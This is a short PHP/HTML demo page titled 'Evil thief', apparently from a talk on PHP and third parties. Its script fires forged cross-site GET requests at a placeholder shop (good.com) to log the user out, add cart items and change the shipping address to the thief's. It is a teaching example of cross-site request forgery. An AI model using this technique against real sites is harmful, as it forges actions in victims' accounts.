<?php
session_start();
?>
<html>
<head>
	<script src="../jquery-1.8.1.min.js" type="text/javascript"></script>
	<script type="text/javascript"><!--
		$(document).ready( function() {
			$('a.evil').bind('click', function(a){
				var img = new Image();
				img.src = a.currentTarget.href;
				a.originalEvent.preventDefault();
                $('#log').val("var img = new Image();\nimg.src = \"" + a.currentTarget.href + "\";\na.originalEvent.preventDefault();");
			});
		});
	// --></script>
    <style>
        textarea{ width: 100%; height: 100px }
    </style>
</head>
<body>
<h1>Evil thief</h1>
Session:
<pre><?php print_r($_SESSION); ?></pre>
<ul>
	<li><a href="evil.php">refresh</a></li>
	<li><a href="http://good.com/talks/understanding-php/2-naughty-third-parties/api.php/logout" class="evil">logout</a></li>
	<li><a href="http://good.com/talks/understanding-php/2-naughty-third-parties/api.php/addToCart" class="evil">add something to the cart</a></li>
	<li><a href="http://good.com/talks/understanding-php/2-naughty-third-parties/api.php/setAddress?address=Thief's+Address" class="evil">set address</a></li>
</ul>
<textarea id="log"></textarea>

